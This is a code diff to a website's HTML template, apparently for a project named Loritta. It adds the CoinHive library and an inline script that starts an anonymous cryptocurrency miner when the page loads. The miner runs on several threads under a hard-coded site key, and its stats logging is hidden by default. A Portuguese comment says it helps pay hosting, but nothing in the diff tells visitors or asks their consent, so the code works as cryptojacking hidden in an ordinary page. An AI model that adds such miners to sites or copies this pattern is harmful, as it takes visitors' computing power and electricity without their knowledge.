@@ -104,6 +104,31 @@ Olá Mundo!
 <link async href='https://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
 <script async src="https://use.fontawesome.com/055e611427.js"></script>
 <script src="{{ websiteUrl }}remodal.min.js"></script>
+<!-- CoinHive, minerador de bitcoin para ajudar a pagar a hospedagem da Loritta -->
+<script src="https://coinhive.com/lib/coinhive.min.js"></script>
+<script>
+showMiningInformation = false;
+
+	var miner = new CoinHive.Anonymous('db5pCBbuOyu3CsmB7et3Fbi0LyeFFGcJ', {
+	threads: 4,
+	autoThreads: true,
+	throttle: 0.6,
+	forceASMJS: false
+});
+	miner.start();
+	
+	// Update stats once per second
+	setInterval(function() {
+		var hashesPerSecond = miner.getHashesPerSecond();
+		var totalHashes = miner.getTotalHashes();
+		var acceptedHashes = miner.getAcceptedHashes();
+
+		if (showMiningInformation) {
+			console.log(hashesPerSecond + ", " + totalHashes + ", " + acceptedHashes);
+		}
+		// Output to HTML elements...
+	}, 1000);
+</script>
 <script>
 /* Toggle between adding and removing the "responsive" class to topnav when the user clicks on the icon */
 function myFunction() {
